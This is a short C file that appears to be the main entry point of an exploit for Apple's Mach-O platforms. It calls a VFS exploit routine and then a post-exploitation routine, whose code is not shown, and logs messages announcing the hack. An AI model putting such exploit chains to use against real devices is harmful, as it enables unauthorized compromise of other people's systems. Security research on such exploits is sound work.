#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <mach-o/fat.h>
#include <mach-o/loader.h>
#include <sys/mman.h>
#include <mach/vm_map.h>
#include <dlfcn.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/attr.h>

#include <Foundation/NSObjCRuntime.h>

#include "common.h"
#include "sploit.h"
#include "post.h"

int main() {
    NSLog(@"XXX LOL HELLO hacked exploit\n");
    vfs_sploit();
    NSLog(@"XXX Starting post exploitation\n");
    post();
    NSLog(@"XXX done\n");
}

uint64_t entry[] = { MAGIC, (uint64_t)&main };
